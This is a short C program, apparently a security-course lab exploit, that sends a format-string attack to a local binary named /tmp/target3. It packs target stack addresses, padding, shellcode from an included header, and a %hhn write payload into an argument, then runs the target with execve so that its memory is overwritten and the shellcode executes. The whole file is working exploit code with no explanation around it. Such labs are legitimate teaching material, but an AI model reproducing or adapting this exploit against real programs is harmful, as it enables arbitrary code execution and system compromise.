#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
	char arg1[116];
	char *args[]={TARGET, arg1, NULL};
	char *env[] = {NULL};
	
	char * payload = "%08x%191x%hhn%245x%hhn%258x%hhn%191x%hhn";
	strcpy(arg1,   "\x64\xfd\xff\xbe");
	strcpy(arg1+4, "ZZZZ");
	strcpy(arg1+8, "\x65\xfd\xff\xbe"); 
	strcpy(arg1+12, "ZZZZ");
	strcpy(arg1+16, "\x66\xfd\xff\xbe"); 
	strcpy(arg1+20, "ZZZZ"); 		
	strcpy(arg1+24, "\x67\xfd\xff\xbe");
	strcpy(arg1+28, shellcode);
	strcat(arg1, payload);
	strcat(arg1, "\x00");

	if(0>execve(TARGET, args, env))
		fprintf(stderr, "execve failed.\n");

	return 0;
}
